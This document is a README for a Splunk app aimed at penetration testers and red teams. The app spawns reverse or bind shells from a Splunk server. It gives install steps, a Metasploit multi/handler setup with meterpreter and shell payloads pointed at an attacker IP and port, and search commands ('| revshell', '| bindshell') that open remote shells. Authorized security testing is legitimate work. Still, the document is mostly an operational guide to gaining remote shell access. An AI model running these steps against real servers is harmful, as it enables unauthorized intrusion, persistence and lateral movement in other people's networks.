Splunk Shells App
Version 1.2

TBG Security
Ryan Hays

This app is to help with penetration testing and Red Teaming within environments that have a Splunk deployment.

This app will allow the engineer to spawn a Reverse of Bind Shell from a Splunk server to allow the engineer to
interact with the server and expand influence within the environment.

# Install
Download the release from https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz

Navigate to the "Manage Apps" and click on "Install app from file"

![Alt text](appserver/static/splunk_apps.png?raw=true "Optional Title")

Click on "Choose File" and select the downloaded release archive.

![Alt text](appserver/static/splunk_install.png?raw=true "Optional Title")

Once it is installed you will have to restart Splunk

![Alt text](appserver/static/splunk_restart.png?raw=true "Optional Title")

For Splunk v6.5 ONLY
Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure the last permission "Sharing for config file-only objects" has "all apps" selected.

![Alt text](appserver/static/splunk_permissions.png?raw=true "Optional Title")

# Usage
Using each of these shells can be done from the Search and Reporting app. Setup a handler first then execute one of the following searches:

## Setup Metasploit Handler

use multi/handler<br>

Pick one of the below

set payload python/meterpreter_reverse_tcp<br>
set payload python/meterpreter_bind_tcp<br>
set payload python/shell_reverse_tcp<br>
set payload python/shell_bind_tcp<br>

set LHOST <ATTACKER IP><br>
set LPORT <ATTCKER PORT><br>
exploit -j<br>

## Bind Shell

'| bindshell SHELLTYPE PORTNUMBER' 

SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)

PORTNUMBER - Specify the port you want the bind shell to listen on. If you do not specify a port number it defaults to 8888


## Reverse Shell

'| revshell SHELLTYPE ATTACKERIP ATTACKERPORT'

SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)

ATTACKERIP - Specify the IP that you want to shell to be sent back to. 

ATTACKERPORT - Specify the port you want the shell to be sent back to.
